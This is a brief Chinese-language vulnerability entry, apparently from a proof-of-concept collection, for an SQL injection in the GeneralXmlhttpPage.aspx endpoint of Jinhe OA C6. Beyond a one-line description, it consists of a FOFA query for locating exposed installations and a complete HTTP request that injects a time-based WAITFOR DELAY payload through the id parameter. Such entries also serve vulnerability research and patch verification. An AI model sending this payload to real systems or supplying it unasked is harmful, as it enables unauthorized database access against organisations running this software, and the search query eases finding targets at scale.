# 金和OA-C6-GeneralXmlhttpPage.aspx存在SQL注入漏洞

金和OAv C6 接口 `/C6/Jhsoft.Web.appraise/GeneralXmlhttpPage.aspx` 存在SQL注入漏洞。

## fofa

```yaml
app="金和网络-金和OA"
```


## poc

```
GET /C6/Jhsoft.Web.appraise/GeneralXmlhttpPage.aspx/?type=CheckAppraiseState&id=1'%3b+WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
```

